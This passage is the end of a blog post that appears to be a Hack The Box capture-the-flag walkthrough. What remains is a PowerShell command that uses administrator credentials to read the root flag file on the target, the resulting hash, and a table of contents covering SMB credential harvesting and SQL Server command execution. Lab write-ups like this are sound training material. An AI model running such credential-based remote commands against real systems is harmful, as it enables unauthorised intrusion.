plain">Credential $Cred </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ScriptBlock {Get</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Content C:\Users\Administrator\Desktop\root</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">txt} </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">b91ccec3305e98240082d4474b848528</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="docusaurus-mt-lg"><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/capture-the-flag">Capture_the_flag</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/ctf">Ctf</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/cybersecurity">Cybersecurity</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/hacking">Hacking</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/smb">Smb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/windows">Windows</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/blog/gulpjs-task-using-powershell"><div class="pagination-nav__sublabel">Newer post</div><div class="pagination-nav__label">How to Run a Sequential gulp.js Task using PowerShell</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/blog/how-to-trace-read-rabbitmq-messages"><div class="pagination-nav__sublabel">Older post</div><div class="pagination-nav__label">How To Trace/Read RabbitMQ Messages</div></a></nav></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#what-is-hack-the-box" class="table-of-contents__link toc-highlight">What is Hack The Box?</a></li><li><a href="#connecting-to-hack-the-box-network" class="table-of-contents__link toc-highlight">Connecting to Hack The Box Network</a></li><li><a href="#enumeration" class="table-of-contents__link toc-highlight">Enumeration</a></li><li><a href="#getting-credentials-using-smbclient" class="table-of-contents__link toc-highlight">Getting Credentials using <code>smbclient</code></a></li><li><a href="#connecting-to-sql-server" class="table-of-contents__link toc-highlight">Connecting to SQL Server</a></li><li><a href="#running-system-commands-from-sql-server-shell" class="table-of-contents__link toc-highlight">Running System Commands from SQL Server Shell</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Knowledgebase</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/docs">Knowledgebase</a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li><li class="footer__item"><a class="footer__link-item" href="/hack_blog">Hack Blog</a></li><li class="footer__item"><a href="https://github.com/kbbgl" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 Kobbi's Knowledgebase, Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>